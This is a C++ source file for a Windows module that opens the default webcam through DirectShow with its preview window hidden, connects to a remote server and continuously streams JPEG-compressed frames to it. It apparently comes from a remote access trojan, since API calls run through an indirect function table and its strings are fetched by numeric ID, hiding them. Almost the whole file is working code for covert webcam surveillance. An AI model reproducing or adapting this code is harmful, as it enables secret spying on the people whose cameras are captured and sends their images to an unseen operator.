// MyVideoTrans.cpp: implementation of the CMyVideoTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyVideoTrans.h"

using namespace Gdiplus;

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyVideoTrans::CMyVideoTrans()
{
	pStmBmp = NULL;
	hMemBmp = NULL;
	m_gFunc.memset(&m_BmpInfo, 0, sizeof(m_BmpInfo));
}

CMyVideoTrans::~CMyVideoTrans()
{
	if(pStmBmp != NULL) 
	{
		pStmBmp->Release();
	}
	if(hMemBmp != NULL)	
	{
		m_gFunc.GlobalFree(hMemBmp);
	}
}

void CMyVideoTrans::StartWork(HWND hWnd)
{
	ULONG_PTR gdiplusToken = NULL;
	GdiplusStartupInput gdiplusStartupInput;
	m_gFunc.GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	//连接到服务器
	if(!Create(WM_CONNECT_VIDEO, hWnd))
	{
		return;
	}

	//接收屏幕分辨率
	if(!RecvData(&m_FrameSize, sizeof(SIZE)))
	{
		return;
	}

	m_gFunc.CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 	if(InitStillGraph(m_FrameSize.cx, m_FrameSize.cy) != 0)
	{
		return;
	}

	DWORD nBitLen = ((m_FrameSize.cx * 24 + 31) / 32) * 4 * m_FrameSize.cy;
	m_BmpInfo.bmiHeader.biBitCount = 24;
	m_BmpInfo.bmiHeader.biWidth = m_FrameSize.cx;
	m_BmpInfo.bmiHeader.biHeight = m_FrameSize.cy;
	m_BmpInfo.bmiHeader.biPlanes = 1;
	m_BmpInfo.bmiHeader.biSize = sizeof( BITMAPINFOHEADER);

	hMemBmp = m_gFunc.GlobalAlloc(GMEM_FIXED, nBitLen);
	m_gFunc.CreateStreamOnHGlobal(hMemBmp, FALSE, &pStmBmp);
	len.LowPart = nBitLen;
	pStmBmp->SetSize(len);
	pZipData = (BYTE*) m_gFunc.GlobalLock(hMemBmp);

	//image/jpeg
	char m_aImageStr[256] = {0};
	m_gFunc.GetMyString(10276, m_aImageStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	WCHAR m_wImageStr[256] = {0};
	m_gFunc.MultiByteToWideChar(CP_ACP, 0, m_aImageStr, m_gFunc.strlen(m_aImageStr), m_wImageStr, 255);
	
	MyMainFunc::GetEncoderClsid(m_wImageStr, &eClsid);
	eParameters.Count = 1;
	nQuality = 75;
	eParameters.Parameter[0].Guid = EncoderQuality;
	eParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
	eParameters.Parameter[0].NumberOfValues = 1;
	eParameters.Parameter[0].Value = &nQuality;
	
	while(1)
	{
		m_gFunc.WaitForSingleObject(mCB.hMultSendDataEvent, 0xffffffff);
		m_gFunc.ResetEvent(mCB.hMultSendDataEvent);

		m_gFunc.WaitForSingleObject(mCB.hMultSendDataMetux, 0xffffffff);
		Bitmap* pTmpBitmap = Bitmap::FromBITMAPINFO((BITMAPINFO*) &m_BmpInfo, mCB.cb.pBuffer);
		m_gFunc.ReleaseMutex(mCB.hMultSendDataMetux);
		
		pTmpBitmap->Save(pStmBmp, &eClsid, &eParameters);

		delete pTmpBitmap;
		len.QuadPart = 0;
		pos.QuadPart = 0;
		pStmBmp->Seek(pos, STREAM_SEEK_CUR, &len);

		if(!SendData(&len.LowPart, sizeof(DWORD)) || !SendData(pZipData, len.LowPart))
		{
			break;
		}

		len.QuadPart = 0;
		pos.QuadPart = 0;
		pStmBmp->Seek(pos, STREAM_SEEK_SET, &len);
	}

}

BOOL CMyVideoTrans::SetFormat(ICaptureGraphBuilder2* pBuilder, IBaseFilter* pCap, long lWidth, long lHeight, WORD iColorBit, __int64 iRate)   
{   
	VIDEOINFOHEADER* phead = NULL;   
	IAMStreamConfig* iconfig = NULL;   

	HRESULT hr;           
	hr = pBuilder->FindInterface(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Interleaved, pCap, IID_IAMStreamConfig, (void**) &iconfig);   
	if(hr != NOERROR)     
	{   
		hr = pBuilder->FindInterface(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCap, IID_IAMStreamConfig, (void**) &iconfig);   
	}   
	if(FAILED(hr))
	{
		return FALSE;
	}

	AM_MEDIA_TYPE* pmt;   
	if(iconfig->GetFormat(&pmt) != S_OK)
	{
		return FALSE;
	}

	if(pmt->formattype == FORMAT_VideoInfo)   
	{   
		phead = (VIDEOINFOHEADER*) pmt->pbFormat;   
		phead->bmiHeader.biBitCount = iColorBit;   
		phead->bmiHeader.biWidth = lWidth;   
		phead->bmiHeader.biHeight = lHeight;   
		phead->bmiHeader.biSizeImage = lWidth * lHeight * iColorBit / 8;   
		phead->AvgTimePerFrame = iRate;   
		if((hr = iconfig->SetFormat(pmt)) != S_OK)
		{
			return FALSE;
		}
	}   
	iconfig->Release();   
	iconfig = NULL;   
	FreeMediaType(*pmt);

	return TRUE;   
}


HRESULT CMyVideoTrans::InitStillGraph(int x, int y)
{
    HRESULT hr;

    // create a filter graph
    //
    hr = m_pGraph.CoCreateInstance( CLSID_FilterGraph );
    if( !m_pGraph )
    {
          return E_FAIL;
    }

    // get whatever capture device exists
    //
    GetDefaultCapDevice( &pCap );
    if( !pCap )
    {
         return E_FAIL;
    }

	//FriendlyName
	char m_aImageStr[256] = {0};
	m_gFunc.GetMyString(10280, m_aImageStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	WCHAR m_wImageStr[256] = {0};
	m_gFunc.MultiByteToWideChar(CP_ACP, 0, m_aImageStr, m_gFunc.strlen(m_aImageStr), m_wImageStr, 255);

    // add the capture filter to the graph
    //
    hr = m_pGraph->AddFilter( pCap, m_wImageStr);
    if( FAILED( hr ) )
    {
         return E_FAIL;
    }

	 // create a sample grabber
    //
    hr = m_pGrabber.CoCreateInstance( CLSID_SampleGrabber );
    if( !m_pGrabber )
    {
        return hr;
    }

 //   CComQIPtr< IBaseFilter, &IID_IBaseFilter > pGrabBase( m_pGrabber );

	pGrabBase = m_pGrabber;

    // force it to connect to video, 24 bit
    //
    CMediaType VideoType;
    VideoType.SetType( &MEDIATYPE_Video );
    VideoType.SetSubtype( &MEDIASUBTYPE_RGB24 );
    hr = m_pGrabber->SetMediaType( &VideoType ); // shouldn't fail
    if( FAILED( hr ) )
    {
        return hr;
    }

	//Grabber
	m_gFunc.GetMyString(10278, m_aImageStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.MultiByteToWideChar(CP_ACP, 0, m_aImageStr, m_gFunc.strlen(m_aImageStr), m_wImageStr, 255);

    // add the grabber to the graph
    //
    hr = m_pGraph->AddFilter( pGrabBase, m_wImageStr);
    if( FAILED( hr ) )
    {
        return hr;
    }

    // build the graph
    
    hr = pCGB2.CoCreateInstance (CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC);
    if (FAILED( hr ))
    {
        return hr;
    }

    hr = pCGB2->SetFiltergraph( m_pGraph );
    if (FAILED( hr ))
    {
         return hr;
    }

	SetFormat(pCGB2,   pCap,   x,   y,   24,   30);   

    // If there is a VP pin present on the video device, then put the 
    // renderer on CLSID_NullRenderer
    
    hr = pCGB2->FindPin(pCap, PINDIR_OUTPUT, &PIN_CATEGORY_VIDEOPORT, NULL, FALSE, 0, &pVPPin);

    // If there is a VP pin, put the renderer on NULL Renderer
    
	//NULL renderer
	m_gFunc.GetMyString(10277, m_aImageStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.MultiByteToWideChar(CP_ACP, 0, m_aImageStr, m_gFunc.strlen(m_aImageStr), m_wImageStr, 255);

    if (S_OK == hr)
    {   
        hr = pRenderer.CoCreateInstance(CLSID_NullRenderer);    
        if (S_OK != hr)
        {
            return S_OK;
        }
        hr = m_pGraph->AddFilter(pRenderer, m_wImageStr);
        if (FAILED (hr))
        {
            return hr;
        }
    }

    hr = pCGB2->RenderStream(
                            &PIN_CATEGORY_PREVIEW,
                            &MEDIATYPE_Interleaved, 
                            pCap, 
                            pGrabBase, 
                            pRenderer);
    if (FAILED (hr))
    {
        // try to render preview pin
        hr = pCGB2->RenderStream( 
                                &PIN_CATEGORY_PREVIEW, 
                                &MEDIATYPE_Video,
                                pCap, 
                                pGrabBase, 
                                pRenderer);

        // try to render capture pin
        if( FAILED( hr ) )
        {
            hr = pCGB2->RenderStream( 
                                    &PIN_CATEGORY_CAPTURE, 
                                    &MEDIATYPE_Video,
                                    pCap, 
                                    pGrabBase, 
                                    pRenderer);
        }
    }

    if( FAILED( hr ) )
    {
         return hr;
    }

    // ask for the connection media type so we know how big
    // it is, so we can write out bitmaps
    //
    AM_MEDIA_TYPE mt;
    hr = m_pGrabber->GetConnectedMediaType( &mt );
    if ( FAILED( hr) )
    {
       return hr;
    }
    
    VIDEOINFOHEADER * vih = (VIDEOINFOHEADER*) mt.pbFormat;
    mCB.lWidth  = vih->bmiHeader.biWidth;
    mCB.lHeight = vih->bmiHeader.biHeight;
    FreeMediaType( mt );

    // don't buffer the samples as they pass through
    //
    hr = m_pGrabber->SetBufferSamples( FALSE );

    // only grab one at a time, stop stream after
    // grabbing one sample
    //
    hr = m_pGrabber->SetOneShot( FALSE );

    // set the callback, so we can grab the one sample
    //
    hr = m_pGrabber->SetCallback( &mCB, 1 );

    // find the video window and stuff it in our window
    //
    pWindow = m_pGraph;
    if( !pWindow )
    {
        return E_FAIL;
    }

    // set up the preview window to be in our dialog
    // instead of floating popup
    //
 
    hr = pWindow->put_Owner(NULL);
    hr = pWindow->put_WindowStyle(WS_CHILD | WS_CLIPSIBLINGS);
	hr = pWindow->put_AutoShow(OAFALSE);
	hr = pWindow->put_Visible(OAFALSE);
 
   // run the graph
    //
	pControl = m_pGraph;
    hr = pControl->Run();
    if(FAILED(hr))
    {
        return hr;
    }
	return 0;
}

BOOL GetDefaultCapDevice( IBaseFilter ** ppCap )
{
    HRESULT hr;

    ASSERT(ppCap);
    if (!ppCap)
        return FALSE;

    *ppCap = NULL;

    // create an enumerator
    //
    CComPtr< ICreateDevEnum > pCreateDevEnum;
    pCreateDevEnum.CoCreateInstance( CLSID_SystemDeviceEnum );

     if( !pCreateDevEnum )
        return FALSE;

    // enumerate video capture devices
    //
    CComPtr< IEnumMoniker > pEm;
    pCreateDevEnum->CreateClassEnumerator( CLSID_VideoInputDeviceCategory, &pEm, 0 );

    if(pEm == NULL)
        return FALSE;

    pEm->Reset( );

	//FriendlyName
	char m_aImageStr[256] = {0};
	m_gFunc.GetMyString(10279, m_aImageStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	WCHAR m_wImageStr[256] = {0};
	m_gFunc.MultiByteToWideChar(CP_ACP, 0, m_aImageStr, m_gFunc.strlen(m_aImageStr), m_wImageStr, 255);
 
    // go through and find first video capture device
    //
    while( 1 )
    {
        ULONG ulFetched = 0;
        CComPtr< IMoniker > pM;

        hr = pEm->Next( 1, &pM, &ulFetched );
        if( hr != S_OK )
            break;

        // get the property bag interface from the moniker
        //
        CComPtr< IPropertyBag > pBag;
        hr = pM->BindToStorage( 0, 0, IID_IPropertyBag, (void**) &pBag );
        if( hr != S_OK )
            continue;

        // ask for the english-readable name
        //
        CComVariant var;
        var.vt = VT_BSTR;
        hr = pBag->Read( m_wImageStr, &var, NULL );
        if( hr != S_OK )
            continue;

        // set it in our UI
        //
        USES_CONVERSION;
  
        // ask for the actual filter
        //
        hr = pM->BindToObject( 0, 0, IID_IBaseFilter, (void**) ppCap );
        if( *ppCap )
            break;
    }
	if(*ppCap == NULL)
	{
		return FALSE;
	}
    return TRUE;
}

char GetVideoInfo()
{
	m_gFunc.CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	CComPtr< IBaseFilter > pCap;
    BOOL ret = GetDefaultCapDevice(&pCap);
    if(!ret)
    {
        return 0;
    }
	return 1;
}
